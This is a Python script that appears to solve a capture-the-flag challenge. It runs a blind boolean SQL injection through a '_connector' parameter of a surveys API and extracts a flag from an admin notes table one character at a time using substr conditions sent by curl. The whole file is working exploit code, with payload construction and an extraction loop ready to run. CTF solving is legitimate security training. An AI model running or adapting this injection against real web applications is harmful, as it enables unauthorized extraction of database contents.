#!/usr/bin/env python3
import json
import subprocess
import sys


ALPHABET = "flag{}0123456789abcdef"


def condition_is_true(base_url: str, condition: str) -> bool:
    connector = f") OR ({condition}) OR ("
    cmd = [
        "curl",
        "-k",
        "-sS",
        "--max-time",
        "20",
        "--get",
        base_url.rstrip("/") + "/api/surveys/",
        "--data-urlencode",
        "id=999",
        "--data-urlencode",
        "title=zzzz",
        "--data-urlencode",
        f"_connector={connector}",
    ]
    raw = subprocess.check_output(cmd, text=True)
    data = json.loads(raw)
    return data.get("count") == 12


def main() -> int:
    base_url = (
        sys.argv[1]
        if len(sys.argv) > 1
        else "https://6719280256edd2f2.chal.ctf.ae"
    )
    prefix = sys.argv[2] if len(sys.argv) > 2 else ""
    for pos in range(len(prefix) + 1, 128):
        for ch in ALPHABET:
            sql_ch = ch.replace("'", "''")
            condition = (
                "substr((SELECT value FROM surveys_adminnote "
                "WHERE value LIKE 'flag{%}' LIMIT 1), "
                f"{pos}, 1) = '{sql_ch}'"
            )
            if condition_is_true(base_url, condition):
                prefix += ch
                print(prefix, flush=True)
                if ch == "}":
                    return 0
                break
        else:
            print(f"stopped at position {pos}; current={prefix!r}", file=sys.stderr)
            return 1
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
